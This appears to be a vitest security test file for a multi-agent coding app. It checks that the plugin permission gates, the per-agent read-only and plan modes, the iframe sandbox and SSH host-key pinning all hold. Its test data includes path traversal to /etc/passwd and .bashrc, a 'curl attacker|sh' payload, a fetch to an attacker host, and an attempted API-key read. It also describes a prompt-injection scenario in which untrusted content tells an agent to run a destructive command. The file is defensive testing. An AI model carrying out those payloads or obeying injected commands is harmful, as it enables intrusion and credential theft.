// Reproducible proof for the three "authority boundary" tests a security
// reviewer asked about (Reddit static-analysis pass). These hit the SAME pure
// gate functions the running app uses — a malicious plugin/prompt/host reaches
// this logic, not the pixels. Run: npx vitest run src/main/security-boundary-proof.test.ts
import { mkdtempSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import type { InstalledPlugin, PluginInvokeResult } from '../shared/plugin-types'
import { invokePluginCapabilityWithPlugins } from './plugin-contract'
import { getModeConfig, codexApprovalDecisionForMode } from './agents/codex-bridge'
import { getClaudeModeOptions } from './agents/claude-bridge'
import { isWriteToolBlocked as opencodeWriteBlocked } from './agents/opencode-bridge'
import { isWriteToolBlocked as hermesWriteBlocked } from './agents/hermes-bridge'
import { isWriteToolBlocked as piWriteBlocked } from './agents/pi-bridge'
import { writeBlocked as crewcoderWriteBlocked } from './agents/crewcoder-bridge'
import { grokPermissionMode } from './agents/grok-bridge'
import { PLUGIN_IFRAME_SANDBOX } from '../shared/plugin-types'

const CLAUDE_MUTATING_TOOLS = ['Bash', 'Edit', 'MultiEdit', 'Write', 'NotebookEdit']

// Narrows the discriminated result union and returns the denial reason,
// failing loudly if the capability unexpectedly succeeded.
function denial(result: PluginInvokeResult): string {
  if (result.ok) throw new Error('expected a permission denial but the capability succeeded')
  return result.error
}

// A plugin that declared ONLY workspace:read in its manifest.
function readOnlyPlugin(overrides: Partial<InstalledPlugin> = {}): InstalledPlugin {
  return {
    id: 'evil-plugin',
    dirName: 'evil-plugin',
    path: mkdtempSync(join(tmpdir(), 'crewcode-evil-')),
    enabled: true,
    approved: true,
    approvalState: 'approved',
    permissionFingerprint: 'workspace:read',
    approvedPermissionFingerprint: 'workspace:read',
    manifest: {
      id: 'evil-plugin',
      name: 'Evil Plugin',
      version: '0.1.0',
      permissions: ['workspace:read'],
      contributes: { tabs: [{ id: 'main', title: 'Evil Plugin', entry: 'panel.html' }] },
    },
    ...overrides,
  }
}

// ─── C. Hostile plugin: declared authority is NOT carried forward ──────────────
describe('C — plugin capability gate rejects undeclared authority', () => {
  it('DENIES workspace:writeFile when the manifest only granted workspace:read', () => {
    const plugins = [readOnlyPlugin()]
    const result = invokePluginCapabilityWithPlugins(
      { registrationId: 'evil-plugin:main', method: 'workspace:writeFile',
        workspaceRoot: '/tmp', params: { sub: 'pwned.txt', text: 'owned' } },
      plugins,
    )
    expect(denial(result)).toContain('requires workspace:write')
  })

  it('DENIES network:fetch outright (no host networking in v0)', () => {
    const result = invokePluginCapabilityWithPlugins(
      { registrationId: 'evil-plugin:main', method: 'network:fetch', params: { url: 'http://attacker.example' } },
      [readOnlyPlugin()],
    )
    expect(denial(result)).toContain('denied')
  })

  it('DENIES secrets:get (no credential exfiltration path)', () => {
    const result = invokePluginCapabilityWithPlugins(
      { registrationId: 'evil-plugin:main', method: 'secrets:get', params: { key: 'OPENAI_API_KEY' } },
      [readOnlyPlugin()],
    )
    expect(denial(result)).toContain('denied')
  })

  it('DENIES a plugin whose permissions changed and lost approval', () => {
    const result = invokePluginCapabilityWithPlugins(
      { registrationId: 'evil-plugin:main', method: 'workspace:readFile', params: { sub: 'x' } },
      [readOnlyPlugin({ approvalState: 'permissions-changed', approved: false })],
    )
    expect(denial(result)).toContain('denied')
  })

  it('DENIES path traversal out of the workspace even WITH workspace:read', () => {
    // The plugin has read permission, but params.sub tries to escape the root.
    const read = invokePluginCapabilityWithPlugins(
      { registrationId: 'evil-plugin:main', method: 'workspace:readFile',
        workspaceRoot: '/home/victim/project', params: { sub: '../../../etc/passwd' } },
      [readOnlyPlugin()],
    )
    expect(denial(read)).toContain('escapes workspace')
  })

  it('DENIES path-traversal WRITE even if workspace:write were granted', () => {
    const writer = readOnlyPlugin()
    writer.manifest.permissions = ['workspace:write']
    const write = invokePluginCapabilityWithPlugins(
      { registrationId: 'evil-plugin:main', method: 'workspace:writeFile',
        workspaceRoot: '/home/victim/project', params: { sub: '../../.bashrc', text: 'curl attacker|sh' } },
      [writer],
    )
    expect(denial(write)).toContain('escapes workspace')
  })

  it('ALLOWS the capability it actually declared (proves it is a gate, not a wall)', () => {
    const cleanRoot = mkdtempSync(join(tmpdir(), 'crewcode-ws-'))
    const result = invokePluginCapabilityWithPlugins(
      { registrationId: 'evil-plugin:main', method: 'workspace:listFiles', workspaceRoot: cleanRoot },
      [readOnlyPlugin()],
    )
    // Read is permitted by the manifest; whatever the fs returns, it is NOT a permission denial.
    if (!result.ok) expect(result.error).not.toContain('requires')
    expect(result).toBeDefined()
  })
})

// ─── D. Injected instruction hits the exec/approval gate ───────────────────────
// The scenario: untrusted content tells the agent to run a destructive command.
// In plan/ask (read-only) modes the sandbox is read-only and approvals auto-DECLINE,
// so the injected instruction cannot silently mutate anything.
describe('D — exec gate: read/plan modes cannot silently execute', () => {
  it('plan mode = read-only sandbox + untrusted approvals', () => {
    const cfg = getModeConfig('plan')
    expect(cfg.sandbox).toBe('read-only')
    expect(cfg.approvalPolicy).toBe('untrusted')
    expect(codexApprovalDecisionForMode('plan')).toBe('decline')
  })

  it('ask mode = read-only sandbox + auto-decline', () => {
    expect(getModeConfig('ask').sandbox).toBe('read-only')
    expect(codexApprovalDecisionForMode('ask')).toBe('decline')
  })

  it('an explicit read-only tool policy overrides even build/full to read-only + decline', () => {
    expect(getModeConfig('full', 'read-only').sandbox).toBe('read-only')
    expect(codexApprovalDecisionForMode('build', 'read-only')).toBe('decline')
  })

  it('build mode still requires per-request approval (does NOT auto-accept)', () => {
    expect(getModeConfig('build').approvalPolicy).toBe('on-request')
    expect(codexApprovalDecisionForMode('build')).toBe(null) // null = defer to human/gate, not auto-accept
  })

  it('only explicit full-access mode auto-accepts — an opt-in, not the default', () => {
    expect(codexApprovalDecisionForMode('full')).toBe('accept')
  })

  // Same property for the Claude bridge, which uses a different mechanism
  // (disallowedTools + permissionMode) than Codex. The reviewer asked whether
  // the gate holds per-agent, not just for one bridge.
  it('Claude: plan mode disallows every mutating/exec tool + blocks ExitPlanMode', () => {
    const opts = getClaudeModeOptions('plan')
    expect(opts.permissionMode).toBe('default')
    for (const tool of CLAUDE_MUTATING_TOOLS) expect(opts.disallowedTools).toContain(tool)
    expect(opts.disallowedTools).toContain('ExitPlanMode')
    expect(opts.allowDangerouslySkipPermissions).not.toBe(true)
  })

  it('Claude: ask mode disallows every mutating/exec tool', () => {
    const opts = getClaudeModeOptions('ask')
    for (const tool of CLAUDE_MUTATING_TOOLS) expect(opts.disallowedTools).toContain(tool)
  })

  it('Claude: read-only tool policy disallows mutating tools regardless of mode', () => {
    const opts = getClaudeModeOptions('build', 'read-only')
    for (const tool of CLAUDE_MUTATING_TOOLS) expect(opts.disallowedTools).toContain(tool)
  })

  it('Claude: no mode blindly bypasses — even full routes through canUseTool for the tripwire', () => {
    expect(getClaudeModeOptions('build').permissionMode).toBe('default')
    expect(getClaudeModeOptions('plan').permissionMode).toBe('default')
    const full = getClaudeModeOptions('full')
    // Full Access auto-approves via canUseTool EXCEPT denylisted commands; it no
    // longer uses the SDK-native bypassPermissions, so a tripwire is always possible.
    expect(full.permissionMode).toBe('default')
    expect(full.allowDangerouslySkipPermissions).toBeUndefined()
  })
})

// ─── D2. Exec gate holds across ALL agent bridges, not just Codex/Claude ───────
// Closes residual-risk #6: the read-only/plan enforcement is proven per bridge.
describe('D2 — every agent bridge blocks writes in read-only/ask/plan', () => {
  const READ_MODES = ['ask', 'plan'] as const

  it('opencode/hermes/pi block write+edit+bash tools in read modes', () => {
    for (const mode of READ_MODES) {
      const opts = { mode } as const
      expect(opencodeWriteBlocked(opts, 'write')).toBe(true)
      expect(opencodeWriteBlocked(opts, 'bash')).toBe(true)
      expect(hermesWriteBlocked(opts, 'edit')).toBe(true)
      expect(hermesWriteBlocked(opts, 'shell')).toBe(true)
      expect(piWriteBlocked(opts, 'write_file')).toBe(true)
    }
    // read tools stay allowed in build (it is a gate, not a wall)
    expect(opencodeWriteBlocked({ mode: 'build' }, 'read')).toBe(false)
  })

  it('opencode/hermes/pi block writes whenever a read-only tool policy is set', () => {
    const ro = { mode: 'build', toolPolicy: 'read-only' } as const
    expect(opencodeWriteBlocked(ro, 'write')).toBe(true)
    expect(hermesWriteBlocked(ro, 'edit')).toBe(true)
    expect(piWriteBlocked(ro, 'bash')).toBe(true)
  })

  it('crewcoder ACP bridge blocks writes in read-only/ask/plan, allows in build/full', () => {
    expect(crewcoderWriteBlocked({ mode: 'ask' })).toBe(true)
    expect(crewcoderWriteBlocked({ mode: 'plan' })).toBe(true)
    expect(crewcoderWriteBlocked({ mode: 'build', toolPolicy: 'read-only' })).toBe(true)
    expect(crewcoderWriteBlocked({ mode: 'build' })).toBe(false)
    expect(crewcoderWriteBlocked({ mode: 'full' })).toBe(false)
  })

  it('grok resolves ask/plan/read-only to a non-asking permission mode, full to bypass only on opt-in', () => {
    expect(grokPermissionMode({ mode: 'ask' })).toBe('dontAsk')
    expect(grokPermissionMode({ mode: 'plan' })).toBe('dontAsk')
    expect(grokPermissionMode({ mode: 'build', toolPolicy: 'read-only' })).toBe('dontAsk')
    expect(grokPermissionMode({ mode: 'build' })).toBe('default')
    expect(grokPermissionMode({ mode: 'full' })).toBe('bypassPermissions')
  })
})

// ─── D3. Plugin iframe sandbox token set stays tight ───────────────────────────
describe('D3 — plugin iframe sandbox cannot gain dangerous tokens', () => {
  it('is exactly the minimal working set', () => {
    expect(PLUGIN_IFRAME_SANDBOX).toBe('allow-scripts allow-same-origin allow-forms')
  })
  it('never grants top-navigation, popups, modals, or pointer-lock', () => {
    for (const danger of ['allow-top-navigation', 'allow-popups', 'allow-modals', 'allow-pointer-lock', 'allow-downloads']) {
      expect(PLUGIN_IFRAME_SANDBOX).not.toContain(danger)
    }
  })
})

// ─── E. SSH TOFU: a changed host key is refused ────────────────────────────────
describe('E — SSH trust-on-first-use pinning refuses a changed key', () => {
  let makeHostVerifier: (hostId: string, onMismatch?: (h: string) => void) => (key: Buffer) => boolean

  beforeAll(async () => {
    // Redirect HOME so we write to a throwaway ~/.crewcode, never the real one.
    process.env.HOME = mkdtempSync(join(tmpdir(), 'crewcode-home-'))
    process.env.USERPROFILE = process.env.HOME
    ;({ makeHostVerifier } = await import('./remote/host-keys'))
  })
  afterAll(() => { /* temp HOME left for OS tmp cleanup */ })

  it('pins the first key seen, accepts the same key, refuses a different key', () => {
    let mismatched = ''
    const verify = makeHostVerifier('example.com:22', (h) => { mismatched = h })

    const original = Buffer.from('ssh-ed25519 AAAA-original-key')
    const attacker = Buffer.from('ssh-ed25519 AAAA-attacker-key')

    expect(verify(original)).toBe(true)   // first use: pinned
    expect(verify(original)).toBe(true)   // same key: still trusted
    expect(verify(attacker)).toBe(false)  // changed key: REFUSED (possible MITM)
    expect(mismatched).toBe('example.com:22')
  })
})
